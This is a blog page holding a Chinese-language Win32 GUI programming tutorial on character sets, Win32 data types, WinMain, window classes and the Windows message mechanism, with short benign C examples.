<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="操作系统内核的进阶之路。">
<meta property="og:type" content="website">
<meta property="og:title" content="walker&#39;s blog">
<meta property="og:url" content="https://walker-nie.github.io/index.html">
<meta property="og:site_name" content="walker&#39;s blog">
<meta property="og:description" content="操作系统内核的进阶之路。">
<meta property="og:locale">
<meta property="article:author" content="walker">
<meta property="article:tag" content="os">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://walker-nie.github.io/"/>





  <title>walker's blog</title>
  








<meta name="generator" content="Hexo 6.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">walker's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://walker-nie.github.io/win32/Win32%20GUI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fup.enterdesk.com%2Fedpic%2Ff6%2Fc9%2Ff6%2Ff6c9f647a533782026c0609ac5d550df.jpg&refer=http%3A%2F%2Fup.enterdesk.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643531815&t=c2c18e0685888311dca4f731dd286208">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="walker's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/win32/Win32%20GUI/" itemprop="url">win32 gui</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-03T13:14:26+08:00">
                2022-01-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/win32/" itemprop="url" rel="index">
                    <span itemprop="name">win32</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  10,922 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  43 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Win32-GUI"><a href="#Win32-GUI" class="headerlink" title="Win32 GUI"></a>Win32 GUI</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>图形化界面程序无法直接打印调信息，我们可以在代码中添加该命令，以实现通过控制台打印调试信息。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment( linker, <span class="meta-string">&quot;/subsystem:\&quot;console\&quot; /entry:\&quot;WinMainCRTStartup\&quot;&quot;</span>)</span></span><br></pre></td></tr></table></figure>



<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>计算机的字符集可分为单字节字符集（<code>SBCS</code>）、多字节字符集（<code>MBCS</code>）、宽字符集（<code>unicode</code>） 。</p>
<ul>
<li><p><strong>单字节字符集（Single-Byte Character System）</strong>：所有字符长度都为1字节，字符串以 <code>0x00</code> 为结束符，数据类型为 <code>char</code> 类型。常见的字符集有：<code>ASCII</code> 码和拓展 <code>ASCII</code> 码。</p>
<p><img src="/win32/Win32%20GUI/image-20210205135853136.png" alt="image-20210205135853136"></p>
</li>
</ul>
<ul>
<li><p><strong>多字节字符集（Multi-Byte Character System / ANSI）</strong>：英文字符用一个字节表示，利用连续多个拓展 <code>ASCII</code> 码来表示一个其他语言文字。<code>MBCS</code> 字符由 <code>0x00</code> 结尾，数据类型是 <code>char</code> 类型。</p>
<p>不同的国家和地区制定了不同的标准，由此产生了 <code>GB2312</code>、<code>GBK</code>、<code>GB18030</code>、<code>Big5</code>、<code>Shift_JIS</code> 等各自的编码标准。这些使用多个字节来代表一个字符的各种汉字延伸编码方式，称为 <code>ANSI</code> 编码。在简体中文 <code>Windows</code> 操作系统中，<code>ANSI</code> 编码代表 <code>GB2312</code> 编码；在繁体中文 <code>Windows</code> 操作系统中，<code>ANSI</code> 编码代表 <code>Big5</code> ；在日文 <code>Windows</code> 操作系统中，<code>ANSI</code>  编码代表  <code>JIS</code>  编码。</p>
<p><img src="/win32/Win32%20GUI/image-20210205140516041.png" alt="image-20210205140516041"></p>
</li>
</ul>
<ul>
<li><strong><code>Unicode</code> 字符集</strong>：通用多八位编码字符集，是国际标准化组织 <code>ISO</code> 为了解决传统的字符编码方案的局限而产生的。它为每种语言中的每个字符设定了统一并且唯一的码值，以满足跨语言的要求。<code>unicode</code> 只是一个字符集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。</li>
</ul>
<ul>
<li><p><strong><code>UTF</code> 编码（<code>Unicode Transformation Format</code>）</strong>：<code>UTF</code> 通过对 <code>Unicode</code> 码值进行对应规则转换后，将编码写入内存/文件中。</p>
<p><img src="/win32/Win32%20GUI/image-20210205141257581.png" alt="image-20210205141257581"></p>
<p>​                <img src="/win32/Win32%20GUI/image-20210205141611094.png" alt="image-20210205141611094"></p>
</li>
</ul>
<p>下图为记事本的文件保存编码格式。（ <code>Windows</code> 默认使用的字符集是 <code>UTF-16</code> 字符集）</p>
<img src="/win32/Win32%20GUI/image-20210205141924724.png" alt="image-20210205141924724" style="zoom:80%;" align="left">



<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><code>Win32 API</code> 数据类型的定义所在头文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;minwindef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;basetsd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WTypebase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Winnt.h&gt;</span></span></span><br></pre></td></tr></table></figure>



<p><em><strong>常用数据类型</strong></em></p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>原定义</th>
</tr>
</thead>
<tbody><tr>
<td>CONST</td>
<td>const</td>
</tr>
<tr>
<td>CALLBACK</td>
<td>_stdcall</td>
</tr>
<tr>
<td>WINAPI</td>
<td>_stdcall</td>
</tr>
<tr>
<td>VOID</td>
<td>VOID</td>
</tr>
<tr>
<td>TCHAR（通用符号）</td>
<td>Unicode：WCHAR；<br>ANSI：char</td>
</tr>
<tr>
<td>TEXT（通用符号）</td>
<td>Unicode：<code>Unicode</code> 字符串；<br>ANSI：<code>ANSI</code> 字符串</td>
</tr>
<tr>
<td><code>API</code> 函数名</td>
<td>W/A</td>
</tr>
<tr>
<td>LPCSTR/LPSTR/PCSTR</td>
<td>指向ANSI字符串类型指针</td>
</tr>
<tr>
<td>LPCWSTR/LPWSTR/PCWSTR</td>
<td>指向Unicode字符串类型</td>
</tr>
<tr>
<td>LPCTSTR/LPTSTR/PCTSTR</td>
<td>指向一8位或16位字符串类型指针</td>
</tr>
<tr>
<td>LPVOID</td>
<td>指向一个未指定类型的32位指针</td>
</tr>
<tr>
<td>LPDWORD</td>
<td>指向一个DWORD型指针</td>
</tr>
</tbody></table>
<p><em><strong>宽字符与多字节字符</strong></em></p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
<th>相关函数</th>
</tr>
</thead>
<tbody><tr>
<td>char</td>
<td>多字节字符，每个 <code>char</code> 占1字节。<br>表示英文字符时是1个字节；表示中文时是2字节</td>
<td>字符串长度：<code>strlen()</code><br>字符串复制：<code>strcpy()</code><br>输出：<code>printf()</code></td>
</tr>
<tr>
<td>wchar_t</td>
<td>宽字符，占2字节。用常量字符给 <code>wchar_t</code> 类型的变量赋值时，前需加 <code>L</code> 。<br>如：<code>wchar_t str[] = &#123;L”walker!”&#125;;</code></td>
<td>字符串长度：<code>wcslen()</code><br>字符串复制：<code>wcscpy</code><br>输出：<code>wprintf()</code></td>
</tr>
</tbody></table>
<p>如以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_wsetlocale(LC_ALL, <span class="string">L&quot;chs&quot;</span>);</span><br><span class="line">	<span class="keyword">wchar_t</span> *str = (<span class="keyword">wchar_t</span> *)<span class="string">L&quot;walker哈哈&quot;</span>;</span><br><span class="line">	wprintf(<span class="string">L&quot;%s\n&quot;</span>, str);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="函数入口"><a href="#函数入口" class="headerlink" title="函数入口"></a>函数入口</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span> <span class="params">(			<span class="comment">// WINAPI, 即_stdcall, 标准调用约定</span></span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hInstance,		<span class="comment">//应用程序当前实例的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hPrevInstance,	<span class="comment">//应用程序的先前实例的句柄。同一个程序打开两次，出现两个窗口第一次打开的窗口就是先前实例的窗口。对于一个32位程序,该参数总为NULL。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTR IpCmdLine, 			<span class="comment">//命令行的字符串的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">int</span> nShowCmd 				<span class="comment">//窗口显示方式, 默认为SW_SHOWDEFAULT; 如窗口最大化、后台运行等</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSTR lpCmdLine, <span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;Hello World!&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32%20GUI/image-20210203173243558.png" alt="image-20210203173243558" style="zoom:80%;" align="left">



<h4 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment( linker, <span class="meta-string">&quot;/subsystem:\&quot;console\&quot; /entry:\&quot;WinMainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>   WINAPI   <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLind, <span class="keyword">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//程序实例句柄</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p %p %p\n&quot;</span>, hInstance, hPrevInstance);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//程序命令行字符串</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;cmd info is %s\n&quot;</span>, lpCmdLind);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//运用程序窗口的初始显示方式</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, nShowCmd);</span><br><span class="line"></span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;over!&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/win32/Win32%20GUI/image-20210203175203387.png" alt="image-20210203175203387"></p>
<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>窗口类 <code>WNDCLASS</code> 是 <code>Windows</code> 中用于创建窗口的模板。每-个窗口类都有一个窗口过程(WndProc)，负责处理发送该类窗口的所有消息。一个应用程序在创建某个类型的窗口前，必须首先注册该“窗口类”(注意, 这里不是C+ +类的类)。窗口类有三种:系统窗口类中一部分是系统内部使用的,而另一部分是可以供系统所有进程使用的，这些窗口类就<br>是基本的控件窗口类。<br>应用程序全局窗口类，就是注册窗口类时以CS_ GLOBALCLASS标志注册的窗口类，这个窗口类在这<br>个进程中，所有模块都可以使用。模块一般是dI模块。 我们知道的程序的皮肤库，很多都是以这种<br>形式实现的，dlI中注册的应用程序全局窗口类，我们程序就可以直接使用这些漂亮的皮肤库提供的<br>控件了。<br>应用程序局部窗口类则是没有CS_ GLOBALCLASS标志注册的窗口类,这个窗口类只在模块范围内使<br>用。我们的EXE如果加载了其他的dII模块，此时EXE的主线程注册的应用程序局部窗口类对于d来<br>说，是看不见的，也就不能使用这个局部窗口类来创建窗口。</p>
<h2 id="GUI-API"><a href="#GUI-API" class="headerlink" title="GUI API"></a>GUI API</h2><p><code>Win32 API </code> 的分类如下表：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
<th>dll</th>
</tr>
</thead>
<tbody><tr>
<td>基础服务（Base Services）</td>
<td>内核函数，提供对Windows系统基础资源的访问接口。如文件系统、内存管理、外部设备、进程(process) 、线程(thread) 以及访问注册表和错误处理机制。</td>
<td>kernel32.dlI</td>
</tr>
<tr>
<td>图形设备接口（GDI）</td>
<td>输出图形内容到显示器、打印机以及其他外部输出设备。</td>
<td>gdi32.dll</td>
</tr>
<tr>
<td>图形化用户界面（GUI）</td>
<td>Windows用户界面相关应用程序接口，提供的功能有创建和管理屏幕和大多数基本控件（control）。如创建窗口、滚动条、消息、菜单、光标、计时器和发送消息以及其他与GUI有关的功能。</td>
<td>user32.dll</td>
</tr>
<tr>
<td>通用控件链接库（Common Control Library）</td>
<td>为应用程序提供接口来访问操作系统提供的一些高级控件。如：状态栏（status bar）、进度条（progress bars）、工具栏（toolbar) 和标签（tab)。</td>
<td>comctl32.dlI</td>
</tr>
<tr>
<td>Windows外壳（Windows Shell）</td>
<td>作为Windows API的组成部分，不仅允许应用程序访问Windows外壳提供的功能，还对之有所改进和增强。</td>
<td>shell32.dII</td>
</tr>
<tr>
<td>网络服务（Network Services）</td>
<td>为访问操作系统提供的多种网络功能提供接口。它包括NetBIOS、Winsock、 NetDDE及RPC等。</td>
<td>ws2_ 32.dIl</td>
</tr>
</tbody></table>
<h3 id="A-W"><a href="#A-W" class="headerlink" title="A/W"></a>A/W</h3><p><code>Win32 API</code> 中带字符串的 <code>API</code> 一般都有两个版本，例如 <code>CreateFileA</code> 和 <code>CreateFileW</code> 。当然也有例外，例如 <code>GetProcAddress</code> 函数。<code>A</code> 代表 <code>ANSI</code> 编码,，<code>W</code> 代表 <code>Unicode</code> 字符集。<code>Windows</code> 中的 <code>Unicode</code> 字符一般指 <code>UCS2</code> 的 <code>UTF16-LE</code> 编码。</p>
<p>当项目的字符集为 <code>Unicode</code> 字符集时，使用的是 <code>Unicode</code> 类型的 <code>API</code> 函数。</p>
<p><img src="/win32/Win32%20GUI/image-20210205145712158.png" alt="image-20210205145712158"></p>
<img src="/win32/Win32%20GUI/image-20210205145627048.png" alt="image-20210205145627048" style="zoom:80%;" align="left">



<h3 id="常用-API"><a href="#常用-API" class="headerlink" title="常用 API"></a>常用 API</h3><table>
<thead>
<tr>
<th>API</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>SetWindowText</td>
<td>设置窗口标题，设置静态文本内容</td>
</tr>
<tr>
<td>GetWindowText</td>
<td>获取窗口内容</td>
</tr>
<tr>
<td>UpdateWindow</td>
<td>更新窗口客户区</td>
</tr>
<tr>
<td>GetModuleHandle</td>
<td>获取当前进程的实例句柄</td>
</tr>
<tr>
<td>GetDlgItemText</td>
<td>获取对话框内容</td>
</tr>
<tr>
<td>GetDesktopWindow</td>
<td>获取桌面进程的句柄</td>
</tr>
<tr>
<td>GetDlgItem</td>
<td>获取指定对话框的控件句柄</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>GetOpenFileName</td>
<td>通过系统文件管理对话框选择文件</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="消息处理机制"><a href="#消息处理机制" class="headerlink" title="消息处理机制"></a>消息处理机制</h2><p><strong><code>Windows</code> 应用程序都是消息（事件）驱动的，任何一个窗口都能够接收消息，并对该消息做出相应的处理。<code>Windows</code> 系统和应用程序均可产生消息，比如当点击、移动鼠标或者敲击键盘，系统捕捉到事件时，便会产生一个消息。</strong>应用程序引起系统改变也会导致系统产生消息，比如一个应用程序改变了窗口的大小。</p>
<p><em><strong>消息处理过程如下：</strong></em></p>
<img src="/win32/Win32%20GUI/image-20210205165259257.png" alt="image-20210205165259257" style="zoom:80%;" align="left">

<ol start="0">
<li><p>每个线程可以有多个窗口对象，当窗口对象创建成功，对应线程对象就存在消息队列。</p>
</li>
<li><p>当用户产生动作时，操作系统将消息打包成一个类，其中包含消息的句柄、操作信息。</p>
</li>
<li><p>通过设备驱动程序，将消息存放在 <code>Windows</code> 的系统消息队列中。</p>
</li>
<li><p>操作系统将系统队列中的消息取出，依据消息句柄将消息投掷于其对应的窗口对象所属的线程消息队列中。</p>
</li>
<li><p>应用程序的消息循环把消息取出后将消息传递给窗口过程。</p>
</li>
<li><p>通过 <code>GetMessage</code>  函数将线程消息队列中的消息取出。</p>
</li>
<li><p>调用 <code>DispatchMessage</code> 函数获取当前窗口句柄进入内核，找到对应的窗口消息处理函数。</p>
</li>
<li><p>内核程序调用消息处理函数处理消息。</p>
</li>
</ol>
<h3 id="MSG"><a href="#MSG" class="headerlink" title="MSG"></a>MSG</h3><p>在进行消息传递时，操作系统会将消息封装在 <code>MSG</code> 结构体中，并将 <code>MSG</code> 存储在系统消息队列中。</p>
<img src="/win32/Win32%20GUI/image-20210205170515568.png" alt="image-20210205170515568" style="zoom: 50%;" align="left">



<h4 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h4><p>在 <code>Windows</code> 中，消息类型可分为：标准消息、命令消息、通知消息。</p>
<p>标准消息：所有以 <code>WM_</code>  开头的消息，<code>WM_COMMAND</code> 除外。</p>
<p>命令消息：来自菜单、工具栏或快捷键的消息，以 <code>WM_COMMAND</code> 呈现。</p>
<p>通知消息：由空间产生的消息，如：按钮点击列表框的选择等。作用是向父窗口通知事件的发生，以 <code>WM_COMMANF</code> 或 <code>WM_NOTIFY</code> 的形式呈现。<code>LOWORD(wParam)</code> 是控件ID，<code>HIWORD(wParam)</code> 是 <code>notification code</code> 。</p>
<hr>
<h5 id="WM-COMMAND"><a href="#WM-COMMAND" class="headerlink" title="WM_COMMAND"></a>WM_COMMAND</h5><p><img src="/win32/Win32%20GUI/image-20210205181147646.png" alt="image-20210205181147646"></p>
<h5 id="VM-NOTIFY"><a href="#VM-NOTIFY" class="headerlink" title="VM_NOTIFY"></a>VM_NOTIFY</h5><p><code>WM_COMMAND</code> 可携带的信息较少，<code>WM_NOTIFY</code> 比 <code>WM_COMMAND</code> 功能更强大，可以存储一些额外的信息。</p>
<p><code>Edit,Button,ListBox</code> 等发送 <code>WM_COMMAND</code> 消息，而 <code>ListView,Toolbar,Tree</code> 等控件发送 <code>WM_NOTIFY</code> 消息，因为需要提供的信息更多。</p>
<p><img src="/win32/Win32%20GUI/image-20210205181829335.png" alt="image-20210205181829335"></p>
<p>我们将所有附加信息都存放在<code>NMHDR(Notify Message Handler)</code> 的一个公共结构体中，该结构体指针通过 <code>LPARAM</code> 指向。</p>
<p><code>NMHDR</code> 的结构如下:</p>
<img src="/win32/Win32%20GUI/image-20210205181947797.png" alt="image-20210205181947797" style="zoom:50%;" align="left">



<p>当某控件需要更多的附加信息时，我们就可以根据该控件的特点定义结构体，但要求第一个字段一定是 <code>NMHDR</code> 。</p>
<p>如我们想要知道 <code>ListView</code> 选中的行和列，那么就可以定义如下：</p>
<img src="/win32/Win32%20GUI/image-20210205182536411.png" alt="image-20210205182536411" style="zoom:50%;" align="left">

<p>以此，我们通过自定义结构体实现对附加信息的扩充。</p>
<p>一些 <code>Notification Code</code> 对所有新的 <code>Windows</code> 控件来说是通用的。</p>
<img src="/win32/Win32%20GUI/image-20210205182835222.png" alt="image-20210205182835222" style="zoom:67%;" align="left">



<h5 id="自定义消息"><a href="#自定义消息" class="headerlink" title="自定义消息"></a>自定义消息</h5><p>我们可以使用 <code>WM_USER</code>  创建自定义消息。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_USER 0x400+x</span></span><br></pre></td></tr></table></figure>



<p><em>消息 <code>ID</code> 范围</em></p>
<img src="/win32/Win32%20GUI/image-20210205183306873.png" alt="image-20210205183306873" style="zoom: 80%;" align="left">



<h4 id="消息发送"><a href="#消息发送" class="headerlink" title="消息发送"></a>消息发送</h4><h5 id="SendMessage"><a href="#SendMessage" class="headerlink" title="SendMessage"></a>SendMessage</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">SendMessage</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HWND   hWnd,		<span class="comment">// 接收消息的窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  UINT   Msg,		<span class="comment">// 消息ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">  WPARAM wParam,	<span class="comment">// 附加消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPARAM lParam		<span class="comment">// 附加消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>将指定的消息发送到一个或多个窗口并阻塞，直到窗口过程已经处理了该消息。</p>
<p>要发送消息并立即返回，可使用 <code>SendMessageCallback</code> 或 <code>SendNotifyMessage</code> 函数。要将消息发布到线程的消息队列中并立即返回，可使用 <code>PostMessage</code> 或 <code>PostThreadMessage</code> 函数。</p>
<h5 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PostMessageA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HWND   hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  UINT   Msg,</span></span></span><br><span class="line"><span class="params"><span class="function">  WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>将消息存放在与当前线程关联的消息队列中，并返回消息，而无需等待线程处理消息。</p>
